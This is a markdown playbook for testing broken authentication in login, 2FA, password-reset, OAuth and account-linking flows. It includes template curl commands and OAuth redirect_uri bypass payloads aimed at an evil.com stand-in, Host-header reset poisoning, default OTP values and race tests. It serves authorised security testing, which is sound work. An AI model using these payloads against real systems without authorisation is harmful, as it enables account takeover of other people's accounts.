# Broken Authentication — Full-Surface Playbook

> Source: `Broken authentication.pdf` (XMind mind map, OCR-extracted). Restructured as a **priority-ranked playbook**.
> **Trigger:** load when testing any login / register / 2FA / password-reset / OAuth / account-linking flow.
> **Order matters:** P0 first (proven ATO chains), then P1 (channel/reset), then P2 (transfers/QR).
> ⚠️ All payloads are **generic templates** — adapt field names to the target. They are NOT verified against a real target. Verify each response before claiming a finding.

---

## P0-1 — 2FA Channel Switch & Weak Codes (High / Critical)

**Why:** If the same OTP validates across channels, MFA is single-factor. Default codes or null OTP = no 2FA at all.

**Test:**
1. Trigger 2FA; intercept the send-code request.
2. Change channel: `"channel":"email"` → `"channel":"sms"` (or inject `"channel":"sms"` when absent).
3. Resend to the second channel; submit the **same code** on the other channel.
4. Try OTP values: `null`, `000000`, `123456`, `111111`, empty string.
5. Parameter confusion: duplicate key `otp=12345&otp=986765` (last/first wins), array `otp:["12535"]` (type confusion → bypass).

**Payload (template):**
```bash
curl -X POST https://target/api/2fa/verify -H "Authorization: Bearer ***" \
  -H "Content-Type: application/json" -d '{"otp":["000000"]}'
```

**Verdict:** same code accepted cross-channel → MFA bypass (High). Default/null code accepted → Critical (2FA nonexistent). **Chain:** `hunt-mfa-bypass`, `hunt-ato`.

---

## P0-2 — OTP Alias via Plus-Addressing (Critical, proven ATO chain)

**Why:** `user+anything@gmail.com` lands in the same inbox but is a DIFFERENT account + separate rate-limit bucket. Gmail also ignores dots. This defeats per-account lockout and lets you re-roll OTPs infinitely.

**Scenario 1 (lockout bypass):**
1. `namos.toooo@gmail.com` → OTP issued
2. Brute force original → 3 failures → code expires / account locked
3. `namos.toooo+1@gmail.com` → **same OTP as original** (shared generator)
4. 2 codes for original + 2 codes for alias → unlimited attempts

**Scenario 2 (brute vs spray):** username constant + OTP variable = brute force; email variable + OTP constant = password spray.

**Test:** register `victim@gmail.com` and `victim+1@gmail.com`; trigger OTP on both; compare codes.

**Payload (template):**
```bash
curl -X POST https://target/api/2fa/resend -d '{"email":"victim+1@gmail.com"}'
```

**Verdict:** identical OTP across aliases → Critical (rate-limit/lockout bypass → ATO).
⚠️ **Pitfall:** plus-addressing alone is NOT a bug — you must prove the same OTP is issued. **Chain:** `hunt-ato`, `hunt-brute-force`.

---

## P0-3 — OAuth redirect_uri Bypass Matrix (High / Critical)

**Why:** redirect_uri is the classic OAuth ATO. Fixed vs dynamic (host or path) determines which bypasses apply.

**Test:** capture a legit authorize URL → fuzz redirect_uri (and state) → send victim the link → check where the code lands.

**Bypass payloads (template):**
```
https://target.com/oauth?redirect_uri=https://evil%E3%80%82com        # fullwidth dot (Chinese dot)
https://target.com/oauth?redirect_uri=https://target.com%09evil.com   # tab → parser splits
https://target.com/oauth?redirect_uri=https://target.com%252eevil.com # double-encode
https://target.com/oauth?redirect_uri=https:/evil.com                  # recollapse
https://target.com/oauth?redirect_uri=https://target.com.evil.com     # suffix
https://evil%E3%80%82com.target.com                                    # fullwidth dot suffix
```

**Also test:** state parameter — check validity, check **state re-use**; code expiration (replay window, multi-use); multi-application code (same code usable on other apps).

**Verdict:** code lands on attacker origin → Critical (account takeover). **Chain:** `hunt-oauth`, `open-redirect-methodology`.

---

## P0-4 — Code / Refresh-Token Race (High)

**Why:** exchange endpoints often accept the same code/refresh token multiple times in parallel.

**Test:**
1. Grab `authorization_code` → race the code→token exchange (2+ parallel requests).
2. After access-revoke, check the code still works (revoked-code reuse).
3. Race `refresh_token` → `access_token` (parallel refresh → multiple valid sessions).

**Verdict:** double exchange succeeds → token-reuse (High). **Chain:** `hunt-race-condition`, `hunt-ato`.

---

## P1-1 — Registration Email Manipulation (Medium / High)

**Why:** email is the identity anchor; if the parser and the mailer disagree, you control the account.

**Test:**
- CRLF injection: `victim@gmail.com%0a` (header injection in registration email)
- Plus-addressing: `victim+number@gmail.com`
- Whitelist bypass domains: `noreply@github.com`, `support@company.com` (if allowed, register privileged-looking addresses)
- **Login immediately after registration** (auto-login / pre-activation session flaws)
- No registration page? → narrow recon: fuzz wordlist + `+FUZZ.js` for hidden signup endpoints; search DOM for endpoints.

**Verdict:** CRLF → email header injection (Medium); auto-login pre-activation → session flaws (High). **Chain:** `hunt-auth-bypass` (registration bypass section), `hunt-ato`.

---

## P1-2 — Password Reset Link / OTP Poisoning (High / Critical)

**Why:** reset tokens are single-purpose; if the link host or token is attacker-controlled → ATO.

**Test:**
1. **Host header poisoning** — send reset with attacker Host; get link from **Referer**-controlled header; look for `ref=` / `link=` parameters (manipulable → `link=https://google.com` = open redirect in reset → critical if it changes scope/subdomains).
2. **Token properties** — predictable? one-time-use? found in DOM / response body? fully hidden parameter?
3. **OTP brute/spray** — username constant + OTP variable; email variable + OTP constant; if code is not expired → vulnerability.

**Payload (template):**
```bash
curl -X POST https://target/api/reset -H "Host: evil.com" \
  -d '{"email":"victim@gmail.com","link":"https://evil.com/tok=PLACEHOLDER"}'
```

**Verdict:** reset link with attacker host → Critical (ATO). **Chain:** `host-header-methodology`, `hunt-ato`, `auth-testing-checklist`.

---

## P1-3 — Link Account CSRF (Medium / High)

**Why:** account linking (OAuth/social) often misses a confirmation step → attacker links their identity to your account.

**Test:**
1. There **should be** a confirmation HTTP request — check if it's missing/skippable.
2. CSRF the final linking request (no CSRF token / no Origin check).
3. Try attacking via DOM; try merging with **deep links** (mobile app linking flows).
4. Email verification skip; using other accounts to access your account (cross-account link).
5. Database vs SMS inconsistency (which channel actually confirms?).

**Verdict:** silent link without confirmation → attacker accesses victim account via their own OAuth login (High). **Chain:** `hunt-csrf`, `hunt-ato`.

---

## P2-1 — Transfer / Redirect-Back Flows (Medium)

**Why:** post-auth redirect and token handoff surfaces are often forgotten.

**Test:**
- How does the app redirect back users? (redirect URL → token grab)
- **Top-level cookie** (`Domain=.target.com`) — cookie bleeds across subdomains.
- **JSONP call (insecure by default)** — token in callback.
- **CORS** — cross-origin token read.
- Confirmation HTTP request — is it enforced?

**Verdict:** token in redirect/JSONP/CORS-accessible → session theft (High). **Chain:** `hunt-cors`, `cache-poisoning-deception`.

---

## P2-2 — QR Code Login Race (Medium)

**Why:** QR login binds a session to a scan; race or replay breaks the binding.

**Test:**
1. Successful login in A → QR link generated in A.
2. Scan the QR while logged into B (session confusion).
3. Issue HTTP requests at small time intervals (race the poll endpoint).
4. Force the user to issue HTTP request (CSRF-style QR scan).

**Verdict:** QR session adopted by attacker → session hijack (Medium/High). **Chain:** `hunt-session`, `hunt-race-condition`.

---

## Compact Checklists (run per target)

### Registration
- [ ] no-registration → narrow recon (wordlists, `+FUZZ.js`, DOM endpoints)
- [ ] login immediately after register (pre-activation session)
- [ ] `victim@gmail.com%0a` CRLF
- [ ] `victim+number@gmail.com`
- [ ] whitelist domains (`noreply@github.com`, `support@company.com`)
- [ ] fuzz all fields with wordlist

### Sign-in
- [ ] response manipulation (flip 401/200, `success:false` → `true`)
- [ ] change 2FA channel mid-flow
- [ ] probe ALL features with a limited/partial session (informational vs state-changing APIs)
- [ ] POST-only for state-changing (verify GET doesn't work)
- [ ] look in JS files for hidden flows
- [ ] default OTPs (`0000`, `000000`, `123456`, `111111`)

### Forgot password
- [ ] token predictable / one-time-use / in DOM / in response
- [ ] URL from input parameter / hidden parameter / path manipulation
- [ ] host header from Referer / extra header or parameter
- [ ] brute (user const + OTP var) / spray (email var + OTP const)
